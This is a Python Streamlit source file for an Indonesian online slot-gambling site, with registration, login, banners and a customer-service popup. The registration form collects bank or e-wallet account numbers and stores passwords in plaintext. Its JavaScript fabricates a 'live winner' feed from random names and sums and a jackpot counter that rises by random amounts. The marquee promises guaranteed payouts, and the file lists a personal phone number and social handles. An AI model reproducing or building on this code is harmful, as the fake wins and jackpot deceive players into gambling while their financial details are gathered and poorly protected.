import streamlit as st
import streamlit.components.v1 as components
import sqlite3
import random

# --- 1. SISTEM DATABASE (FITUR ASLI) ---
def init_db():
    conn = sqlite3.connect('database_s2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (username TEXT PRIMARY KEY, password TEXT, email TEXT, telepon TEXT,
                  bank TEXT, norek TEXT, narek TEXT, referral TEXT)''')
    conn.commit()
    conn.close()

def cek_login(u, p):
    conn = sqlite3.connect('database_s2.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE username=? AND password=?", (u, p))
    data = c.fetchone()
    conn.close()
    return data

def simpan_pendaftar(u, p, e, t, b, nr, na, ref):
    try:
        conn = sqlite3.connect('database_s2.db')
        c = conn.cursor()
        c.execute("INSERT INTO users VALUES (?,?,?,?,?,?,?,?)", (u, p, e, t, b, nr, na, ref))
        conn.commit()
        conn.close()
        return True
    except sqlite3.IntegrityError:
        return False

init_db()

# --- 2. LOGIKA STATE ---
if 'v_code' not in st.session_state:
    st.session_state.v_code = str(random.randint(1000, 9999))

# --- 3. CSS GLOBAL (HILANGKAN 3 TITIK & NAVIGASI PREMIUM) ---
st.markdown("""
<style>
    /* KUNCI TOTAL: Hilangkan 3 Titik, Header, dan Footer */
    header, footer, #MainMenu, .stDeployButton {
        visibility: hidden !important;
        display: none !important;
    }

    .stApp {
        background-image: url("https://i.imgur.com/0sCszBw.png");
        background-attachment: fixed; 
        background-size: cover; 
        background-position: center;
    }

    .block-container {
        padding: 0.5rem !important;
        padding-bottom: 160px !important;
    }

    /* Styling Tombol & Input */
    .stTextInput input {
        background-color: rgba(26, 29, 36, 0.9) !important;
        color: #00e676 !important; 
        border: 1px solid #00e676 !important;
    }

    div.stButton > button[kind="primary"] {
        background: linear-gradient(180deg, #00e676 0%, #00c853 100%) !important;
        color: white !important; 
        font-weight: 800 !important;
        border: 2px solid #ffd700 !important; 
        border-radius: 12px !important;
    }
</style>
""", unsafe_allow_html=True)

# --- 4. FUNGSI DIALOG ---
@st.dialog("HALAMAN MASUK")
def login_dialog():
    u = st.text_input("User Name", key="l_u")
    p = st.text_input("Kata Sandi", type="password", key="l_p")
    if st.button("PROSES MASUK", type="primary", use_container_width=True):
        if cek_login(u, p): 
            st.success(f"✅ Halo {u}, Selamat Bermain!"); st.balloons()
        else: 
            st.error("⚠️ Akun tidak ditemukan!")

@st.dialog("PENDAFTARAN", width="large")
def register_dialog():
    st.markdown("### 📝 DAFTAR AKUN BARU")
    col1, col2 = st.columns(2)
    with col1:
        u = st.text_input("* User Name", key="reg_u")
        p = st.text_input("* Kata sandi", type="password", key="reg_p")
        p2 = st.text_input("* Ulang Kata sandi", type="password", key="reg_p2")
        e = st.text_input("* Email", key="reg_e")
    with col2:
        t = st.text_input("* No Telepon", key="reg_t")
        b = st.selectbox("* Bank", ["BCA", "MANDIRI", "BNI", "BRI", "DANA", "OVO", "GOPAY"])
        nr = st.text_input("* Nomor Rekening", key="reg_nr")
        na = st.text_input("* Nama Pemilik Rekening", key="reg_na")

    ref = st.text_input("Kode Referral (Opsional)", key="reg_ref")
    st.markdown(f"**Kode Validasi: :red[{st.session_state.v_code}]**")
    v_in = st.text_input("* Masukkan Kode", key="reg_v")

    if st.button("DAFTAR SEKARANG", type="primary", use_container_width=True):
        if p != p2: st.error("❌ Kata sandi tidak cocok!")
        elif v_in != st.session_state.v_code: st.error("❌ Kode validasi salah!")
        elif u and p and nr and na:
            if simpan_pendaftar(u, p, e, t, b, nr, na, ref):
                st.success("✅ Berhasil! Silakan Login.")
                st.session_state.v_code = str(random.randint(1000, 9999))
            else: 
                st.error("⚠️ Username sudah ada!")

# --- 5. TAMPILAN ATAS ---
c1, c2 = st.columns([2, 1])
with c1: st.image("https://i.imgur.com/pjj1xQo.png", width=200)
with c2:
    if st.button("MASUK", use_container_width=True): login_dialog()
    if st.button("DAFTAR", use_container_width=True): register_dialog()

# --- 6, 7, 8. BANNER, RGB MARQUEE, WINNER, JACKPOT & CHAT POPUP ---
fitur_komplit_html = """
<style>
    /* Slider Banner */
    .slider-container { width: 100%; overflow: hidden; border-radius: 15px; border: 2px solid #ffd700; }
    .slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; }
    .slider::-webkit-scrollbar { display: none; }
    .slider img { width: 100%; flex-shrink: 0; scroll-snap-align: start; }

    /* RGB Marquee */
    .rgb-border {
        margin-top: 10px; padding: 3px; border-radius: 10px;
        background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
        background-size: 400% 400%; animation: rgb-move 5s linear infinite;
    }
    .inner-marquee { background: #1a1d24; border-radius: 8px; padding: 10px; overflow: hidden; }
    .scrolling-text {
        display: inline-block; white-space: nowrap; color: #ffd700; font-weight: bold; font-size: 14px;
        animation: jalan-terus 15s linear infinite;
    }

    /* Winner Box */
    .winner-box { background: rgba(26, 29, 36, 0.95); border-radius: 12px; border: 1px solid #ffd700; padding: 12px; margin-top:10px; }
    .win-content { display: flex; justify-content: space-between; color: white; font-size: 13px; }

    /* Jackpot Digital */
    .jp-wrapper {
        margin-top: 10px; background: #000; border: 2px solid #ffd700; border-radius: 15px;
        padding: 10px; text-align: center; box-shadow: 0 0 15px #ffd700;
    }
    .jp-num { color: #ff0000; font-size: 24px; font-weight: 900; font-family: monospace; text-shadow: 0 0 10px red; }

    /* LIVE CHAT POPUP PREMIUM */
    #btn-chat-s2 {
        position: fixed; bottom: 110px; right: 20px; width: 65px; height: 65px;
        background: radial-gradient(circle, #00fbff, #0072ff); border-radius: 50%;
        display: flex; justify-content: center; align-items: center; font-size: 35px;
        z-index: 999999999; cursor: pointer; border: 3px solid white; box-shadow: 0 0 20px #00fbff;
    }
    #overlay-s2 { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999999998; }
    #popup-s2 {
        display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
        width: 85%; max-width: 380px; background: #1a1a1a; border: 2px solid #ffd700;
        border-radius: 20px; z-index: 9999999999; overflow: hidden; font-family: sans-serif;
    }
    .social-row { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #333; color: white !important; text-decoration: none !important; font-weight: bold; }
    .btn-action { background: #ffd700; color: #000 !important; padding: 5px 12px; border-radius: 6px; font-size: 11px; }

    @keyframes rgb-move { 0%{background-position:0% 50%} 100%{background-position:100% 50%} }
    @keyframes jalan-terus { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
</style>

<div class="slider-container">
    <div class="slider" id="mainSlider">
        <img src="https://i.imgur.com/IA1m2GF.png">
        <img src="https://i.imgur.com/vUeCcl3.png">
        <img src="https://i.imgur.com/kek6NF4.png">
    </div>
</div>

<div class="rgb-border">
    <div class="inner-marquee">
        <div class="scrolling-text">🔥 SELAMAT DATANG DI S2 SEJATI SLOT - SITUS GACOR TERPERCAYA - PROSES DEPO WD PASTI DIBAYAR LUNAS & TERCEPAT SE-INDONESIA! 🔥</div>
    </div>
</div>

<div class="winner-box">
    <div style="color:#ffd700; font-size:11px; font-weight:bold; border-bottom:1px solid #333; margin-bottom:8px;">🏆 LIVE WINNER REAL-TIME</div>
    <div class="win-content">
        <span id="u-win">Memuat...</span>
        <span id="g-win" style="color:#ffd700;"></span>
        <span id="a-win" style="color:#00e676; font-weight:bold;"></span>
    </div>
</div>

<div class="jp-wrapper">
    <div style="color:#ffd700; font-size:10px; font-weight:bold;">✨ PROGRESSIVE JACKPOT ✨</div>
    <div class="jp-num">RP <span id="jp-val">8.715.784.119</span></div>
</div>

<div id="btn-chat-s2" onclick="openS2()">💬</div>
<div id="overlay-s2" onclick="closeS2()"></div>
<div id="popup-s2">
    <div style="background:linear-gradient(90deg,#ffd700,#ff8c00); padding:12px; color:#000; font-weight:bold; display:flex; justify-content:space-between; align-items:center;">
        <span>👤 CUSTOMER SERVICE</span>
        <span onclick="closeS2()" style="cursor:pointer; font-size:25px;">&times;</span>
    </div>
    <img src="https://i.supaimg.com/e2052feb-b9dd-4dac-b762-c0dee9b0bd7b/8501f28f-3d3c-4440-8af2-b9a41789e2e6.jpg" style="width:100%;">
    <a href="https://wa.me/6285781785177" target="_blank" class="social-row"><span>🟢 WhatsApp</span><span class="btn-action">Klik Disini</span></a>
    <a href="https://t.me/aldiafnd07" target="_blank" class="social-row"><span>🔵 Telegram</span><span class="btn-action">Klik Disini</span></a>
    <a href="https://www.facebook.com/aldi.pehul.12" target="_blank" class="social-row"><span>🔵 Facebook</span><span class="btn-action">Klik Disini</span></a>
    <div style="padding:15px; font-size:11px; color:#ccc; text-align:center; background:#1a1a1a;">Layanan CS S2 SEJATI Aktif 24 Jam!</div>
</div>

<script>
    // Slider
    let sIdx = 0; setInterval(() => { sIdx = (sIdx + 1) % 3; document.getElementById('mainSlider').scrollTo({left: document.getElementById('mainSlider').clientWidth * sIdx, behavior: 'smooth'}); }, 4500);
    
    // Winner
    const us = ["J***p", "R***ky", "S2***ot", "A***ng", "M***ky"];
    const gs = ["Gates of Olympus", "Mahjong Ways 2", "Starlight Princess"];
    setInterval(() => {
        document.getElementById('u-win').innerText = "User: " + us[Math.floor(Math.random() * us.length)];
        document.getElementById('g-win').innerText = "[" + gs[Math.floor(Math.random() * gs.length)] + "]";
        document.getElementById('a-win').innerText = "IDR " + (Math.floor(Math.random() * 5000000) + 500000).toLocaleString('id-ID');
    }, 3000);

    // Jackpot
    let jVal = 8715784119; setInterval(() => { jVal += Math.floor(Math.random() * 50); document.getElementById('jp-val').innerText = jVal.toLocaleString('id-ID'); }, 150);

    // Chat Func
    function openS2() { document.getElementById('overlay-s2').style.display='block'; document.getElementById('popup-s2').style.display='block'; }
    function closeS2() { document.getElementById('overlay-s2').style.display='none'; document.getElementById('popup-s2').style.display='none'; }
</script>
"""
components.html(fitur_komplit_html, height=650)

# --- 7. INPUT LOGIN TENGAH ---
st.markdown("### 🔑 LOGIN UTAMA")
st.text_input("Username", key="m_u")
st.text_input("Password", type="password", key="m_p")
st.button("MASUK SEKARANG", type="primary", use_container_width=True)

# --- 9. NAVIGASI BAR BAWAH (CURVE STYLE) ---
st.markdown("""
<style>
    .nav-container {
        position: fixed; bottom: 0; left: 0; width: 100%; height: 75px;
        background: #111; display: flex; justify-content: space-around;
        align-items: center; border-top: 2px solid #ffd700; z-index: 99999;
    }
    .floating-center {
        position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%);
        width: 75px; height: 75px; background: linear-gradient(180deg, #ffd700 0%, #ff8c00 100%);
        border-radius: 50%; border: 4px solid #111; display: flex; justify-content: center;
        align-items: center; z-index: 100000; box-shadow: 0 0 15px #ffd700; text-decoration: none;
    }
    .nav-link { text-align: center; color: white; text-decoration: none; width: 20%; font-size: 10px; font-weight: bold; cursor: pointer; }
</style>
<div class="floating-center"><b style="color:black; font-size:11px;">MASUK</b></div>
<div class="nav-container">
    <div class="nav-link">🏠<br>HOME</div>
    <div class="nav-link">🎁<br>PROMO</div>
    <div style="width: 20%;"></div> 
    <div class="nav-link">📲<br>APK</div>
    <div class="nav-link" onclick="openS2()">💬<br>CHAT</div>
</div>
""", unsafe_allow_html=True)
